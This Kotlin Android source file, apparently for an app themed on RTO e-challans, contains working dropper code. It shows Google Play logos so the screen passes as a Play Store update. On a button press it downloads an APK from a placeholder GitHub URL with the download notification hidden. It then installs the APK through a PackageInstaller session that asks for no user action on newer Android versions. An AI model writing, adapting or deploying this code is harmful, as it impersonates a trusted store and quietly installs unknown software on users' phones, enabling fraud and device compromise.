package com.example.rtoechallan

import android.app.DownloadManager
import android.app.PendingIntent
import android.content.*
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.*
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.bumptech.glide.Glide
import java.io.File
import java.io.FileInputStream

class MainActivity : AppCompatActivity() {

    // 1. Apna GitHub Raw Link yahan dalo
    private val APK_URL = "https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/setup.apk"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val appLogo = findViewById<ImageView>(R.id.app_logo)
        val playLogo = findViewById<ImageView>(R.id.play_logo)
        val btnUpdate = findViewById<Button>(R.id.btnInstall)
        val progressBar = findViewById<ProgressBar>(R.id.downloadProgress)

        // 2. Play Store Logos Load Karo
        Glide.with(this).load("https://img.icons8.com/color/512/google-play.png").into(appLogo)
        Glide.with(this).load("https://www.gstatic.com/android/market_images/web/play_prism_h_rgb.png").into(playLogo)

        // 3. Update Button Click
        btnUpdate.setOnClickListener {
            btnUpdate.isEnabled = false
            btnUpdate.text = "Downloading..."
            progressBar.visibility = View.VISIBLE
            startDownloadWithProgress(APK_URL, progressBar, btnUpdate)
        }
    }

    private fun startDownloadWithProgress(url: String, progressBar: ProgressBar, btn: Button) {
        val file = File(getExternalFilesDir(null), "update.apk")
        if (file.exists()) file.delete()

        val request = DownloadManager.Request(Uri.parse(url))
            .setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN)
            .setDestinationInExternalFilesDir(this, null, "update.apk")

        val manager = getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
        val downloadId = manager.enqueue(request)

        // Progress Calculation Thread
        Thread {
            var downloading = true
            while (downloading) {
                val cursor = manager.query(DownloadManager.Query().setFilterById(downloadId))
                if (cursor != null && cursor.moveToFirst()) {
                    val status = cursor.getInt(cursor.getColumnIndex(DownloadManager.COLUMN_STATUS))
                    
                    val bytesDownloaded = cursor.getInt(cursor.getColumnIndex(DownloadManager.COLUMN_BYTES_DOWNLOADED_SO_FAR))
                    val bytesTotal = cursor.getInt(cursor.getColumnIndex(DownloadManager.COLUMN_TOTAL_SIZE_BYTES))

                    if (status == DownloadManager.STATUS_SUCCESSFUL) {
                        downloading = false
                    }

                    if (bytesTotal > 0) {
                        val progress = ((bytesDownloaded * 100L) / bytesTotal).toInt()
                        runOnUiThread { progressBar.progress = progress }
                    }
                    cursor.close()
                }
                SystemClock.sleep(500)
            }

            // Download khatam, ab Install shuru
            runOnUiThread {
                progressBar.visibility = View.GONE
                btn.text = "Installing..."
                val downloadedFile = File(getExternalFilesDir(null), "update.apk")
                if (downloadedFile.exists()) {
                    installPacket(this, downloadedFile)
                }
            }
        }.start()
    }

    private fun installPacket(context: Context, file: File) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)
            
            val inputStream = FileInputStream(file)
            val outputStream = session.openWrite("pro_install_session", 0, file.length())
            inputStream.copyTo(outputStream)
            
            session.fsync(outputStream)
            inputStream.close()
            outputStream.close()

            val intent = Intent(context, InstallReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                context, sessionId, intent, 
                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            
            session.commit(pendingIntent.intentSender)
            session.close()
            
        } catch (e: Exception) {
            runOnUiThread {
                Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }
}
